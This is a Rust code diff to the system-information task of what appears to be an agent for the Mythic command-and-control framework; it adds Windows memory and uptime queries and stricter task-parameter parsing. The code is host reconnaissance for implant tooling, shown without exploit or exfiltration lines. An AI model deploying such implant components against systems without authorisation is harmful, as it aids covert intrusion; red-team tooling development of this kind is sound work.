@@ -5,6 +5,7 @@
 //! Windows: systeminfo command / GetSystemInfo
 
 use mythic::{TaskMessage, TaskResponse};
+use serde::Deserialize;
 use serde_json::Value;
 
 #[cfg(target_os = "linux")]
@@ -178,6 +179,9 @@ fn gather_sysinfo() -> Result<Value, String> {
 #[cfg(windows)]
 fn gather_sysinfo() -> Result<Value, String> {
     use crate::sys::encoding::decode_output;
+    use windows_sys::Win32::System::SystemInformation::{
+        GetTickCount64, GlobalMemoryStatusEx, MEMORYSTATUSEX,
+    };
 
     let hostname = std::process::Command::new("hostname")
         .output()
@@ -211,6 +215,18 @@ fn gather_sysinfo() -> Result<Value, String> {
     };
 
     let cpu_model = std::env::var("PROCESSOR_IDENTIFIER").unwrap_or_default();
+    let mem_total = unsafe {
+        let mut status = MEMORYSTATUSEX {
+            dwLength: std::mem::size_of::<MEMORYSTATUSEX>() as u32,
+            ..std::mem::zeroed()
+        };
+        if GlobalMemoryStatusEx(&mut status) != 0 {
+            status.ullTotalPhys / 1024
+        } else {
+            0
+        }
+    };
+    let uptime = unsafe { GetTickCount64() / 1000 };
 
     Ok(serde_json::json!({
         "hostname": hostname,
@@ -219,8 +235,8 @@ fn gather_sysinfo() -> Result<Value, String> {
         "arch": arch,
         "cpu_model": cpu_model,
         "cpu_cores": cpu_cores,
-        "mem_total_kb": 0,    // would need GlobalMemoryStatusEx FFI
-        "uptime_secs": 0,     // would need GetTickCount64 FFI
+        "mem_total_kb": mem_total,
+        "uptime_secs": uptime,
     }))
 }
 
@@ -237,6 +253,18 @@ fn gather_sysinfo() -> Result<Value, String> {
 }
 
 pub fn handle(task: &TaskMessage) -> TaskResponse {
+    #[derive(Deserialize, Default)]
+    #[serde(deny_unknown_fields)]
+    struct Params {}
+    let parameters = task.parameters.trim();
+    let parameters = if parameters.is_empty() {
+        "{}"
+    } else {
+        parameters
+    };
+    if let Err(e) = serde_json::from_str::<Params>(parameters) {
+        return TaskResponse::failed(task.id, &format!("sysinfo parse error: {e}"));
+    }
     match gather_sysinfo() {
         Ok(info) => TaskResponse {
             task_id: task.id,
